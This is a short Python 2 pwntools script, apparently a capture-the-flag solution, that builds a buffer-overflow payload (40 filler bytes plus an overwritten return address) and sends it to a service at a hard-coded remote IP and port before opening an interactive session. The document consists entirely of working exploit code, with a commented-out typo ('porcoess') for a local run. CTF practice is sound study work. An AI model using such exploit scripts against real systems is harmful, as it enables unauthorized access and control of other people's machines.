
from pwn import *
# context(log_level = 'debug')
playload = 'A'*40 + p64(0x00400796)
# playload = 'A'*40 
r = remote('104.199.235.135',2111)

# LOCAL ELF
# r = porcoess('./a.out')

print r.recvuntil(':')
print r.sendline(playload)
print r.recvuntil(':')
print r.send('hack')
r.interactive()
